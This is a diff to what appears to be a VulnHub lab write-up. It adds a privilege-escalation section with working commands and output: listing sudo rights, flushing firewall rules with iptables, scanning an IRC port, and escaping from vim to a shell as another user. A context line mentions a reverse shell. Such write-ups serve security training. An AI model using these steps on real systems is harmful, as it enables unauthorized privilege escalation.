@@ -161,7 +161,122 @@ I used a python reverse shell and URL encoded it, started a listener and got the
 ![shell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/dff8d11f-e174-4d70-b476-be2747674f33)
 
 
-## 4.Privilege Escalation
+## 4.Privilege Escalation 1
+
+Check the sudo permissions :
+
+```text
+www-data@ubuntu:/home$ sudo -l
+
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
+    (ALL) NOPASSWD: /sbin/iptables
+```
+
+we can run vim as user waldo and also iptables without password :
+
+first let's check listening ports on the machine :
+
+```text
+www-data@ubuntu:/home$ netstat -plnt
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::60080                :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+we can see that port 6667 is on listen state, and it was filtered when we first scanned the machine with nmap
+
+i just use iptables to flush any deny action on this port :
+
+before flush :
+
+```text
+www-data@ubuntu:/home$ sudo iptables  -v -L -n
+Chain INPUT (policy ACCEPT 1034K packets, 124M bytes)
+ pkts bytes target     prot opt in     out     source               destination
+  270 17659 ACCEPT     tcp  --  *      *       127.0.0.1            0.0.0.0/0            tcp dpt:6667
+    4   176 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:6667
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+
+Chain OUTPUT (policy ACCEPT 1031K packets, 330M bytes)
+ pkts bytes target     prot opt in     out     source               destination
+```
+
+after flush :
+
+```text
+www-data@ubuntu:/home$ sudo iptables -F
+
+www-data@ubuntu:/home$ sudo iptables  -v -L -n
+Chain INPUT (policy ACCEPT 16 packets, 842 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+
+Chain OUTPUT (policy ACCEPT 10 packets, 647 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+```
+
+now we can reach this port with nmap :
+
+```text
+root@kali: nmap -sV -sC 192.168.127.233 -p6667
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 03:44 EDT
+Nmap scan report for 192.168.127.233
+Host is up (0.00038s latency).
+
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     UnrealIRCd
+| irc-info:
+|   users: 4
+|   servers: 1
+|   chans: 1
+|   lusers: 4
+|   lservers: 0
+|   server: wallaby.fake.server
+|   version: Unreal3.2.10.4. wallaby.fake.server
+|   uptime: 0 days, 0:49:01
+|   source ident: nmap
+|   source host: 59FC08E0.5EB7BEDC.CD8EC85.IP
+|_  error: Closing Link: hcoevlpsy[192.168.127.128] (Quit: hcoevlpsy)
+MAC Address: 00:0C:29:96:AB:45 (VMware)
+Service Info: Host: wallaby.fake.server
+```
+
+so this is irc service and is open to communicate, the second permission is to run VIM as waldo
+
+so lets exploit this to become user waldo :
+
+```text
+www-data@ubuntu:/home/waldo$ sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
+```
+
+in VIM widow type `:!/bin/bash` and you will get a terminal with user waldo access :
+
+
+![waldo](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d7fbaaa4-2be7-42fb-ac79-86434cc1b67e)
+
+```text
+waldo@ubuntu:~$ id
+uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+```
+
+
+
 
 
 
